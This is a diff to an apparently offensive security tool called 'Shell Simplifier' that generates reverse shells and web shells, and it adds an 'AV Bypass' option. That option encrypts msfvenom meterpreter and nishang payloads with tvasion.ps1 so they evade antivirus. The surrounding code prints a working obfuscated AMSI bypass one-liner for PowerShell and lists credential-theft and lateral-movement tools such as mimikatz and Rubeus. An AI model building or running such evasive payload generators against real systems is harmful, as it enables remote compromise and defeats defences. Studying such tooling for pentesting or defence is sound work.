@@ -1,12 +1,11 @@
 #!/usr/bin/python3
 #developed by YaSsInE
 #reverse shells based on pentestmonkey and nishang shells
-# ln -s $(pwd)/simplifier.py /usr/local/bin/
 import re
 import subprocess
-import colorama
 from subprocess import call
 import os
+import colorama
 from colorama import Fore,Style
 import signal
 import sys
@@ -16,7 +15,8 @@ import pyfiglet
 from Crypto.Cipher import AES
 import base64
 import readline
-
+import random
+import string
 #detect ctrl c
 def signal_handler(sig, frame):
     print(Fore.GREEN+'\nThank you for using my tool !! See you soon ...')
@@ -29,7 +29,7 @@ def win(ip, port, command):
     print(Fore.RED+50*"-")
     print(Fore.BLUE+command)
     print(Fore.RED+50*"-")
-    print(Fore.GREEN+"Payload generated and saved in your working directory !")
+    print(Fore.GREEN+"[+] Payload generated and saved in your working directory !")
     if "windows/meterpreter/reverse_tcp" in command or "windows/x64/meterpreter/reverse_tcp" in command:
         print(Fore.GREEN+50*"-")
         print(Fore.BLUE +"[+] ip: "+str(ip))
@@ -108,7 +108,7 @@ def select_item(list, length):
         try:
             float(inp)
         except ValueError:   
-            print (Fore.RED+"Please select a number from the list !")
+            print (Fore.RED+"[-] Please select a number from the list !")
             exit(1)
     try:        
         if res in range(1, length+1):
@@ -167,7 +167,7 @@ def get_port():
         if res:
             return res
     except:
-        print(Fore.RED+"Port not accepted ! Please try again with a valid port number.")
+        print(Fore.RED+"[-] Port not accepted ! Please try again with a valid port number.")
         exit(1)
         
 def write_to_file(path, data):
@@ -354,7 +354,7 @@ def nishang(ip,port):
     print(Fore.BLUE +"[+] port: "+str(port))
     print(Fore.GREEN+50*"-")         
     print(Fore.RED + "[+] Your nishang shell has been created and saved in your working directory !") 
-
+    return output_file_name
 
 def rce_shell():
     readed_data = ""
@@ -390,7 +390,7 @@ def aes():
         if plain_text:
             print(Fore.GREEN +"Decoded data: "+plain_text)
         else:
-            print(Fore.RED+"Please make sure that you are using the correct IV and Key !")    
+            print(Fore.RED+"[-] Please make sure that you are using the correct IV and Key !")    
     except:
         if signal.signal(signal.SIGINT, signal_handler):
             return '0'  
@@ -401,10 +401,70 @@ def amsi():
     string = """sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )"""
     print(Fore.RED+"Paste this string into powershell: \n\n"+Fore.GREEN +string+"\n")
 
+def msfc(ip,port,shell):
+    if shell == "windows/x64/exec":
+        inp = input(Fore.BLUE+"[+] cmd command to run in the system >> "+Fore.GREEN)
+        if str(inp) == "":
+            print(Fore.RED+"[-] Command can not be empty !")
+            exit(1)
+        command = "msfvenom -p "+str(shell)+" CMD='"+str(inp)+"' -f exe > win-cmd-shell.exe"
+        win(ip,port,command)
+        return "win-cmd-shell.exe"
+    elif shell == "windows/x64/meterpreter/reverse_tcp":
+        command = "msfvenom -p "+str(shell)+" LHOST="+str(ip)+" LPORT="+str(port)+" -f exe > Win-shell-"+str(port)+".exe"
+        win(ip,port,command)
+        shell_name = "Win-shell-"+str(port)+".exe"
+        return shell_name
+
+def temp_folder():
+    name = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(10))
+    return name
+
+def tvasion(ip,port,type,shell):
+    tmp_folder = temp_folder()
+    temp = "/"+tmp_folder+"/"
+    if type == "nishang":
+        nishang_name = nishang(ip,port)
+        nishang_path = str(current_path)+"/"+nishang_name
+        dir1 = subprocess.check_output(["mkdir", current_path+temp]) #create a temp folder
+        path_to_encrypted = str(current_path)+temp #get the path
+        enc_tool_path = str(script_pt)+"/tvasion.ps1" #encrypt tool path 
+        args = " -t ps1 "+nishang_path+ " -o "+tmp_folder #save the file into temp folder
+        command = enc_tool_path+args
+        #encr = subprocess.check_output([command]) #excute  the encryption
+        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=None, shell=True)
+        output = process.communicate()
+        res = subprocess.check_output(["ls", path_to_encrypted])
+        en_file_name = res.decode('UTF-8').strip() # get encrypted file name
+        exact_file_name_path = path_to_encrypted+en_file_name #encrypted nishang
+        final_shell = current_path+"/en-"+nishang_name
+        original_shell = current_path+"/"+nishang_name
+        copy = subprocess.check_output(["cp", exact_file_name_path,final_shell]) # copy the encrypted to the working dir    
+        delete_original = subprocess.check_output(["rm","-r",path_to_encrypted])
+        delete_original = subprocess.check_output(["rm",original_shell])
+    elif type == "msf":
+        shell_name = msfc(ip,port,shell)
+        shell_path = str(current_path)+"/"+shell_name
+        dir1 = subprocess.check_output(["mkdir", current_path+temp]) #create a temp folder
+        path_to_encrypted = str(current_path)+temp #get the path
+        enc_tool_path = str(script_pt)+"/tvasion.ps1" #encrypt tool path
+        args = " -t exe "+shell_path+ " -o "+tmp_folder #save the file into temp folder
+        command = enc_tool_path+args
+        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=None, shell=True)
+        output = process.communicate()
+        res = subprocess.check_output(["ls", path_to_encrypted])
+        en_file_name = res.decode('UTF-8').strip() # get encrypted file name
+        exact_file_name_path = path_to_encrypted+en_file_name
+        final_shell = current_path+"/en-"+shell_name
+        original_shell = current_path+"/"+shell_name
+        copy = subprocess.check_output(["cp", exact_file_name_path,final_shell]) # copy the encrypted to the working dir    
+        delete_original = subprocess.check_output(["rm","-r",path_to_encrypted])
+        delete_original = subprocess.check_output(["rm",original_shell])
+
 script_pt = script_path()
 current_path = get_path()
 
-os_list = ["Windows","Linux","magic bytes reverse shell for linux","AES 256 mode_cbc base64 decoder","AMSI powershell bypass","Bruteforce template"]
+os_list = ["Windows","Linux","magic bytes reverse shell for linux","AV Bypass","AES 256 mode_cbc base64 decoder","AMSI powershell bypass","Bruteforce template"]
 main_list_windows = ["generate shell","enum tools","windows tools"]
 main_list_linux = ["generate shell","tools and enumeration scripts"]
 windows_shells = ["nishang shell","windows/exec","windows/x64/exec","windows/meterpreter/reverse_tcp","windows/x64/meterpreter/reverse_tcp","php cmd web shell","aspx cmd web shell"]
@@ -414,6 +474,10 @@ windows_enum = ["jaws.ps1","PowerUp.ps1","Sherlock.ps1","winPEAS.bat","wp.exe"]
 windows_tools =["accesschk.exe","curl.exe","nc.exe","powerview.ps1","wget.exe","base64.exe","dumpcap.exe","powercat.ps1","procdump64.exe","chisel86.exe","juicy.exe","powermad.ps1","Rubeus.exe","cmd.exe","mimikatz64.exe","powershell.exe","SharpHound.exe"]
 magic_bytes = ["jpg simple php magic bytes","jpg full php magic bytes","gif simple php magic bytes","gif full php magic bytes"]
 template = ["python","php"]
+encrypted = ["nishang","msf"]
+msf = ["windows/x64/exec","windows/x64/meterpreter/reverse_tcp"]
+msf_size = len(msf)
+encrypted_size = len(encrypted)
 template_size = len(template)
 magic_bytes_size = len(magic_bytes)
 windows_tools_size = len(windows_tools)
@@ -429,9 +493,10 @@ ascii_banner = pyfiglet.figlet_format("Shell Simplifier !")
 author = "\n\t\t\t\t\t\t\tby YaSsInE\n\n"
 contact1 = "\t\tWebsite    : https://0xyassine.github.io\n"
 contact2 = "\t\tHackTheBox : https://www.hackthebox.eu/profile/143843\n"
+version = "\t\t\t\t\t\t\t\t v1.1\n"
 
 clear()
-print(Fore.RED + ascii_banner+author+contact1+contact2)
+print(Fore.RED + ascii_banner+author+contact1+contact2+Fore.GREEN+version)
 
 
 signal.signal(signal.SIGINT, signal_handler)
@@ -445,7 +510,7 @@ if os_item == "Windows":
         if windows_item == "nishang shell":
             ip = get_ip()
             port = get_port()
-            nishang(ip, port)
+            test = nishang(ip, port)
         elif windows_item == "windows/exec":
             windows("0", "0", windows_item)   
         elif windows_item == "windows/x64/exec":
@@ -586,3 +651,17 @@ elif os_item == "Bruteforce template":
         move_files("template","python","brute.py")
     elif template_item == "php":
         move_files("template","php","brute.php")
+elif os_item == "AV Bypass":         
+    encrypted_item = select_item(encrypted, encrypted_size)
+    if encrypted_item == "nishang":
+        ip = get_ip()
+        port = get_port()
+        tvasion(ip,port,"nishang","")
+    elif encrypted_item == "msf":
+        msf_item = select_item(msf, msf_size)
+        if msf_item == "windows/x64/exec":
+            tvasion("","","msf",msf_item)
+        elif msf_item == "windows/x64/meterpreter/reverse_tcp":
+            ip = get_ip()
+            port = get_port()            
+            tvasion(ip,port,"msf",msf_item)
